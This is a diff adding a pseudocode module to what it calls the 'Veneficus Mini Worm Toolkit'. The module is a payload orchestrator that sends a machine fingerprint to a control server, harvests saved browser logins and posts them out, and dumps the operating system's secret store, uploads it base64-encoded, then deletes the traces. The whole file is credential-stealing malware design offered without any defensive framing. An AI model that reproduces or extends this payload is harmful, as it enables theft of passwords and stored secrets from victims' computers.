@@ -1,0 +1,33 @@
+# +--------------------------------------------------------------------------+
+# |                                                                          |
+# |                       Veneficus Mini Worm Toolkit                        |
+# |                                                                          |
+# +--------------------------------------------------------------------------+
+
+# src/payload/mod.pseudo
+# Harvest orchestrator.
+
+SUBMODULES: harvest, paste_swap, secret_store_dump
+
+FUNCTION init(): log "payload ready"
+
+FUNCTION run():
+    # 1. Host card
+    control.post("card", json(machine_card()))
+
+    # 2. Browser secrets
+    creds = harvest.all_logins()
+    IF creds:
+        control.post("logins", json of url/user/password triples)
+
+    # 3. OS secret-store dump
+    dump_path = temp file with a throwaway name
+    IF secret_store_dump.capture(dump_path):
+        control.post("store_dump", base64(file bytes))
+        delete dump_path
+
+    # Cookie harvest exists in harvest.pseudo and is NEVER called.
+
+FUNCTION machine_card() -> JSON:
+    hostname, os, kernel, memory, cpu_count,
+    machine_guid, username, AGENT_ID, SAFE
